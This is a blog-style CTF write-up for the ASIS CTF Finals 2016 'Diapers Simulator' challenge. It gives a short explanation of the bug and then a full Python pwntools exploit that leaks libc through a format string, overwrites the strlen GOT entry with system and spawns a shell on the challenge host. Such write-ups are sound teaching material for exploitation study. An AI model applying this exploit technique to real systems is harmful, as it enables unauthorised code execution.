---
layout: post
alias: "/blog/2016/09/12/asis-ctf-finals-2016-diapers-simulator/"
date: "2016-09-12T02:26:40+09:00"
title: "ASIS CTF Finals 2016: Diapers Simulator"
tags: [ "ctf", "writeup", "asis-ctf", "pwn", "format-string-attack" ]
---

Only doing.

## solution

If the value of wetness is negative, you can overwrite the sponsor's message and do format string attack.

The struct is like below:

``` c
struct diaper_t {
    char brand[12];
    int wetness;
    char sponsor_message[];
};
```

`1) Change Diapers` can make the `wetness` negative.
`3. Bunny Rabbit` fills `brand` with $12$ bytes without null byte.
`0) Change Brand` use `strlen` to know the length and this allows us to modify the `sponsor_message`.
`2) Leave` has a format string bug with `sponsor_message`.
Now, you can do format string attack.

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='diapers.asis-ctf.ir')
parser.add_argument('port', nargs='?', default=1343, type=int)
args = parser.parse_args()
context.log_level = 'debug'

elf = ELF('./diapers')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p = remote(args.host, args.port)
p.recvuntil('> ')
p.sendline('3')
for i in range(257):
    p.recvuntil('> ')
    p.sendline('1')
buflen = 108
offset = 15
def fsa(s, header=''):
    payload = ''
    payload += header
    assert len(payload) <= offset
    payload += ' ' * (offset - len(payload))
    payload += s
    assert len(payload) <= buflen
    payload += ' ' * (buflen - len(payload))
    p.recvuntil('> ')
    p.sendline('0')
    p.send(payload)
    p.recvuntil('> ')
    p.sendline('2')
    x = 'And now a message from our sponsors:\n'
    y = "Sorry, you're not allowed to leave your baby unless it's dry!\n"
    p.recvuntil(x)
    return p.recvuntil(y)[ : - len(y) ]

assert fsa('%18$p').startswith('%#x' % u32('%18$'))

# leak libc
libc_start_main  = u32(fsa('%20$s   ' + p32(elf.got['__libc_start_main']))[: 4])
setvbuf          = u32(fsa('%20$s   ' + p32(elf.got['setvbuf']))[: 4])
log.info('__libc_start_main: %#x', libc_start_main)
log.info('setvbuf: %#x', setvbuf)
libc_base = setvbuf - libc.symbols['setvbuf']
log.info('libc base: %#x', libc_base)

# got overwrite
write = { elf.got['strlen']: libc_base + libc.symbols['system'] }
payload = fmtstr.fmtstr_payload(18, write)
log.info('payload:\n' + fiddling.hexdump(payload))
fsa(payload, header='/bin/sh\0')

# run
p.recvuntil('> ')
p.sendline('0')

time.sleep(1)
p.sendline('id')
p.interactive()
```
